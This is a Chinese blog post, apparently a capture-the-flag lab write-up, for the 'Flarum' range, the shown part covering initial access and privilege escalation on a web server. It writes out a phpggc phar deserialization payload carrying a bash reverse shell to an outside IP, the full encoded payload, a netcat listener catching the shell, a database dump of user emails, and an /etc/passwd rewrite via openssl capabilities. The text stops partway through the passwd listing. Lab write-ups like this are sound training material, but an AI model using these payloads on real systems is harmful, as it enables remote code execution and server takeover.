<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>春秋云境-Flarum | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="靶标介绍Flarum是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、kerberos协议以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。  第1关 请测试 Flarum 社区后台登录口令的安全性，并获取在该服务器上执行任意命令的能力。   第2关 通过kerber">
<meta property="og:type" content="article">
<meta property="og:title" content="春秋云境-Flarum">
<meta property="og:url" content="https://tao0845.github.io/posts/f85c7fea/index.html">
<meta property="og:site_name" content="ta0的小站">
<meta property="og:description" content="靶标介绍Flarum是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、kerberos协议以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。  第1关 请测试 Flarum 社区后台登录口令的安全性，并获取在该服务器上执行任意命令的能力。   第2关 通过kerber">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ooo.0x0.ooo/2025/02/03/OGDIhL.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2025/02/03/OGD3ti.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2025/02/03/OGHasj.png">
<meta property="og:image" content="https://i.111666.best/image/rn4mUK4L3Yi3UtgYc75k6x.png">
<meta property="og:image" content="https://i.111666.best/image/yadmzX3b2RxeOn3RHJi1AH.png">
<meta property="og:image" content="https://i.111666.best/image/Jx0TuvriDZd3p72SvFLAPE.png">
<meta property="og:image" content="https://i.111666.best/image/KA8DfIeXRYvjF1QocAFvgy.png">
<meta property="og:image" content="https://i.111666.best/image/Ve1xQ2thejXQO17GH801at.png">
<meta property="og:image" content="https://i.111666.best/image/TmGLNGkcKhlUKHvN8Zua0y.png">
<meta property="article:published_time" content="2025-02-03T03:01:49.460Z">
<meta property="article:modified_time" content="2025-02-03T07:57:02.228Z">
<meta property="article:author" content="ta0">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ooo.0x0.ooo/2025/02/03/OGDIhL.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">122</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">14</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">1</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%A0%87%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">靶标介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flarum-RCE"><span class="toc-number">2.</span> <span class="toc-text">flarum RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REP-Rroasting"><span class="toc-number">3.</span> <span class="toc-text">AS-REP Rroasting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RBCD"><span class="toc-number">4.</span> <span class="toc-text">RBCD</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DCSync"><span class="toc-number">5.</span> <span class="toc-text">DCSync</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/f85c7fea/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">春秋云境-Flarum</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-02-03 11:01:49" itemprop="dateCreated datePublished" datetime="2025-02-03T11:01:49+08:00">2025-02-03</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">3.5k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">19m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="靶标介绍"><a href="#靶标介绍" class="headerlink" title="靶标介绍"></a>靶标介绍</h2><p>Flarum是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、kerberos协议以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。</p>
<blockquote>
<p>第1关 请测试 Flarum 社区后台登录口令的安全性，并获取在该服务器上执行任意命令的能力。</p>
</blockquote>
<blockquote>
<p>第2关 通过kerberos攻击的获取域内权限，并进行信息收集。</p>
</blockquote>
<blockquote>
<p>第3关 请尝试获取内网中Fileserver主机的权限，并发现黑客留下的域控制器后门。</p>
</blockquote>
<blockquote>
<p>第4关 请尝试利用黑客留下的域控制器后门获取域控的权限。</p>
</blockquote>
<h2 id="flarum-RCE"><a href="#flarum-RCE" class="headerlink" title="flarum RCE"></a>flarum RCE</h2><p>根据第一关提示应该是后台弱口令<br><img src="https://ooo.0x0.ooo/2025/02/03/OGDIhL.png" alt="OGDIhL.png" loading="lazy"><br>主页有个邮箱，可以猜测用户名是administrator<br><img src="https://ooo.0x0.ooo/2025/02/03/OGD3ti.png" alt="OGD3ti.png" loading="lazy"><br>爆破出是<code>administrator:1chris</code><br>搜索<code>flarum 1.6.0</code>相关漏洞<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/flarum-rce-tour.html">https://www.leavesongs.com/PENETRATION/flarum-rce-tour.html</a></p>
<p>从头看到尾学习了一下发现是利用flarum自定义css功能，在编译Less的时候使用利用data-uri打phar反序列化实现rce<br>先利用phpggc生成payload插入到<code>forum.css</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  phpggc <span class="token parameter variable">-p</span> <span class="token function">tar</span> <span class="token parameter variable">-b</span> Monolog/RCE6 system <span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/101.43.121.110/4567 0>&amp;1'"</span>                     
dGVzdC50eHQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAwMDA2NDQAAAAAAAAAAAAAAAAAAAAAADAwMDAwMDAwMDA0ADAwMDAwMDAwMDAwADAwMDYyMTcgMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1c3RhcgAwMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB0ZXN0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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TWhtezabesu2xxl0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class="token operator">=</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2025/02/03/OGHasj.png" alt="OGHasj.png" loading="lazy"><br><img src="https://i.111666.best/image/rn4mUK4L3Yi3UtgYc75k6x.png" alt="image" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">Last login: Mon Feb  <span class="token number">3</span> <span class="token number">10</span>:52:54 <span class="token number">2025</span> from <span class="token number">183.213</span>.110.198
root@VM-4-13-ubuntu:~<span class="token comment"># nc -lvnp 4567</span>
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">4567</span>
Connection received on <span class="token number">39.98</span>.107.251 <span class="token number">56734</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">1176</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
www-data@web01:/$ <span class="token function">id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code></pre>
<p>成功拿到shell，<br>先收集进入数据库收集一下信息，方便后续域内渗透</p>
<pre class="language-none"><code class="language-none">mysql&gt; select email from flarum_users;
+----------------------------+
| email                      |
+----------------------------+
| administrator@xiaorang.lab |
| chenbin@xiaorang.lab       |
| chenbo@xiaorang.lab        |
| chenchao@xiaorang.lab      |
| chenchen@xiaorang.lab      |
| chenfang@xiaorang.lab      |
| chenhong@xiaorang.lab      |
</code></pre>
<p>拿到user后然后就是最喜欢的提权环节了<br><img src="https://i.111666.best/image/yadmzX3b2RxeOn3RHJi1AH.png" alt="image" loading="lazy"><br>openssl设置了capabilities，写&#x2F;etc&#x2F;passwd然后拿rootshell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@web01:/tmp$ <span class="token function">touch</span> a.txt
www-data@web01:/tmp$ <span class="token function">nano</span> a.txt
www-data@web01:/tmp$ <span class="token function">cat</span> a.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="token punctuation">(</span>admin<span class="token punctuation">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
